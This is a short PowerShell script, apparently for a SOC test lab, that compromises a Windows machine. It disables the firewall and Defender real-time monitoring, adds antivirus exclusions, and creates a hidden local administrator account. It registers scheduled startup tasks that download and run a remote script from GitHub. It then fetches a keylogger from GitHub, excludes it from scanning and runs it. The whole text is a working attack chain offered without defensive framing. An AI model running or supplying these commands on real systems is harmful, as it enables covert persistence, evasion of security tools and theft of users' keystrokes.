Set-NetFirewallProfile -Profile Public -Enabled False
Set-MpPreference -DisableRealTimeMonitoring $True
Add-MpPreference -ExclusionPath "C:\Users\setup"
New-LocalUser -Name "newuser" -AccountNeverExpires -Password $password
Add-LocalGroupMember -Group "Administrators" -Member "newuser"
Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\Public\startupscript.ps1"
$action1 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-File "C:\Users\Public\startupscript.ps1"'
$action2 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument 'Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\Public\startupscript.ps1"'
$trigger1 = New-JobTrigger -AtStartup -RandomDelay "00:30:00"
$trigger2 = New-JobTrigger -AtStartup
Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "task1"
Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName "task2"
Invoke-WebRequest https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1 -OutFile "C:\Users\Public\keylogger.ps1"
Start-Sleep -s 30
Add-MpPreference -ExclusionPath "C:\Users\Public\keylogger.ps1"
New-Item "C:\temp\" -itemType Directory
cd C:\Users\Public
.\keylogger.ps1
